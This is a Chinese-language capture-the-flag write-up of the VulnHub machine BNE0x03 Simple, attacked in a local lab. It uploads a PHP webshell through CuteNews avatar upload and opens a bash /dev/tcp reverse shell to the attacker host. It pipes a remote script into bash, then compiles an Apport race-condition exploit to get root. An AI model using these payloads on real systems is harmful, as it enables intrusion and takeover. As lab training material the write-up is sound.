+++
date = '2026-11-07T09:37:36+08:00'
draft = false
title = '[VulnHub靶机]BNE0x03Simple渗透记录'
tags = ['渗透','Vulnhub','文件上传','CuteNews','Kernel']
+++

## 信息收集

攻击机IP: 10.10.10.3
靶机IP: 10.10.10.9, 10.10.10.10 (靶机有两个网卡)

```shell
┌──(kali㉿kali)-[~/BNE0x03Simple]
└─$ sudo arp-scan -l                          
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.9      00:0c:29:75:eb:c5       VMware, Inc.
10.10.10.10     00:0c:29:75:eb:c5       VMware, Inc.
10.10.10.254    00:50:56:e0:f0:a6       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.020 seconds (126.73 hosts/sec). 5 responded
```

扫描探测靶机端口开放情况

```shell
┌──(kali㉿kali)-[~/BNE0x03Simple]
└─$ sudo nmap --min-rate 10000 -p- 10.10.10.9 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 09:41 +0800
Nmap scan report for 10.10.10.9
Host is up (0.00011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:75:EB:C5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.80 seconds

┌──(kali㉿kali)-[~/BNE0x03Simple]
└─$ sudo nmap --min-rate 10000 -p- 10.10.10.10
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 09:41 +0800
Nmap scan report for 10.10.10.10
Host is up (0.00058s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:75:EB:C5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
```

两个网卡开放的端口一样, 访问80端口, 可发现是同一个页面, 故无需再重复扫描  
根据页面底部信息可知该系统为CuteNews

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BNE0x03Simple/%E4%B8%A4%E7%BD%91%E5%8D%A1%E7%9B%B8%E5%90%8C.avif)

深入扫描

```shell
┌──(kali㉿kali)-[~/BNE0x03Simple]
└─$ sudo nmap -sT -sV -O -sC -p80 10.10.10.9
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 09:45 +0800
Nmap scan report for 10.10.10.9
Host is up (0.00084s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Please Login / CuteNews
MAC Address: 00:0C:29:75:EB:C5 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Sony Android TV (Android 5.0) (94%), Android 5.1 (94%), Linux 3.2 - 3.16 (94%), Linux 4.4 (94%), Android 7.1.2 (Linux 3.4) (94%), Linux 3.8 - 3.16 (94%), Android 4.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.45 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/BNE0x03Simple]
└─$ sudo nmap --script=vuln -p80 10.10.10.9
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-07 09:46 +0800
Nmap scan report for 10.10.10.9
Host is up (0.00090s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.9
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://10.10.10.9:80/
|     Form id: login_form
|     Form action: /index.php
|
|     Path: http://10.10.10.9:80/?register
|     Form id: regpassword
|     Form action: /index.php?register
|
|     Path: http://10.10.10.9:80/index.php
|     Form id: login_form
|     Form action: /index.php
|
|     Path: http://10.10.10.9:80/?register&lostpass
|     Form id:
|     Form action: /index.php
|
|     Path: http://10.10.10.9:80/index.php?register
|     Form id: regpassword
|_    Form action: /index.php?register
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-enum:
|_  /rss.php: RSS or Atom feed
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 00:0C:29:75:EB:C5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 322.03 seconds
```

网站目录爆破

```shell
┌──(kali㉿kali)-[~/BNE0x03Simple]
└─$ dirsearch -u http://10.10.10.9/ -i 200,301,302,500                

  _|. _ _  _  _  _ _|_    v0.4.4
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295

Target: http://10.10.10.9/

[09:52:34] Scanning: 
[09:52:41] 301 -   306B - /core  ->  http://10.10.10.9/core/                
[09:52:41] 301 -   306B - /docs  ->  http://10.10.10.9/docs/                
[09:52:41] 200 -    1KB - /docs/
[09:52:41] 200 -   12KB - /example.php                                      
[09:52:42] 200 -    1KB - /favicon.ico                                      
[09:52:42] 200 -    2KB - /index.php                                        
[09:52:42] 200 -    2KB - /index.php/login/                                 
[09:52:43] 200 -    3KB - /LICENSE.txt                                      
[09:52:45] 200 -    28B - /print.php                                        
[09:52:45] 200 -    2KB - /README.md                                        
[09:52:46] 200 -   105B - /rss.php                                          
[09:52:46] 200 -    5KB - /search.php                                       
[09:52:46] 301 -   307B - /skins  ->  http://10.10.10.9/skins/              
[09:52:47] 301 -   309B - /uploads  ->  http://10.10.10.9/uploads/          
[09:52:47] 200 -   740B - /uploads/                                         
                                                                             
Task Completed
```

## Web渗透

我们没有凭据, 但网站提供了注册服务, 我们可以注册一个账户

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BNE0x03Simple/%E6%B3%A8%E5%86%8C%E8%B4%A6%E6%88%B7.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BNE0x03Simple/%E7%99%BB%E5%BD%95.avif)

点击Personal Options, 来到用户信息界面, 注意到我们可以上传头像

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BNE0x03Simple/%E7%94%A8%E6%88%B7%E8%B5%84%E6%96%99.avif)

上传一句话木马试试

```php
<?php system($_GET["cmd"]);?>
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BNE0x03Simple/%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F.avif)

之前dirsearch扫到了uploads目录, 访问发现我们上传的脚本被重命名了

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BNE0x03Simple/%E5%8F%91%E7%8E%B0%E4%B8%8A%E4%BC%A0%E7%9A%84php%E8%84%9A%E6%9C%AC.avif)

访问发现可以执行代码

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BNE0x03Simple/RCE.avif)

攻击机开启监听, 访问`http://10.10.10.9/uploads/avatar_pieyue_shell.php?cmd=bash+-c+%22bash+-i+%3E%26%2Fdev%2Ftcp%2F10.10.10.3%2F4444+0%3E%261%22`即可获得shell

```shell
┌──(kali㉿kali)-[~/BNE0x03Simple]
└─$ rlwrap nc -lnp 4444
bash: cannot set terminal process group (1196): Inappropriate ioctl for device
bash: no job control in this shell
www-data@simple:/var/www/html/uploads$ whoami
whoami
www-data
```

## 权限提升

终端升级

```shell
www-data@simple:/var/www/html/uploads$ python -c "import pty;pty.spawn('/bin/bash')"
```

### 内核提权

运行提权辅助脚本

```shell
www-data@simple:/tmp$ curl -k https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh | bash
```

```shell
┌──(kali㉿kali)-[~/BNE0x03Simple]
└─$ searchsploit apport Privilege Escalation
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation                                                              | linux/local/37088.c
Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege Escalation                                                                          | linux/local/36782.sh
Apport 2.19 (Ubuntu 15.04) - Local Privilege Escalation                                                                              | linux/local/38353.txt
Apport 2.20 - Local Privilege Escalation                                                                                             | linux/local/49572.txt
Apport/Abrt (Ubuntu / Fedora) - Local Privilege Escalation                                                                           | linux/local/36746.c
Apport/ABRT - 'chroot' Local Privilege Escalation (Metasploit)                                                                       | linux/local/43971.rb
Apport/ABRT - 'chroot' Local Privilege Escalation (Metasploit)                                                                       | linux/local/43971.rb
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

使用37088

```shell
┌──(kali㉿kali)-[~/BNE0x03Simple]
└─$ searchsploit -m 37088
```

传输到靶机并编译

```shell
www-data@simple:/tmp$ wget http://10.10.10.3:8000/37088.c
www-data@simple:/tmp$ gcc 37088.c -o exp
www-data@simple:/tmp$ ./exp
created /var/crash/_bin_sleep.33.crash
crasher: my pid is 4792
apport stopped, pid = 4793
getting pid 4792
current pid = 4791..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..2500..
** child: current pid = 4792
** child: executing /bin/su
Password: sleeping 2s..

checker: mode 4516
waiting for file to be unlinked..writing to fifo
fifo written.. wait...
waiting for /etc/sudoers.d/core to appear..

checker: new mode 32768 .. done
checker: SIGCONT
checker: writing core
checker: done
success
# whoami
whoami
root
```

查看flag

```shell
# cd /root
cd /root
# ls
ls
flag.txt
# cat flag.txt
cat flag.txt
U wyn teh Interwebs!!1eleven11!!1!
Hack the planet!
```
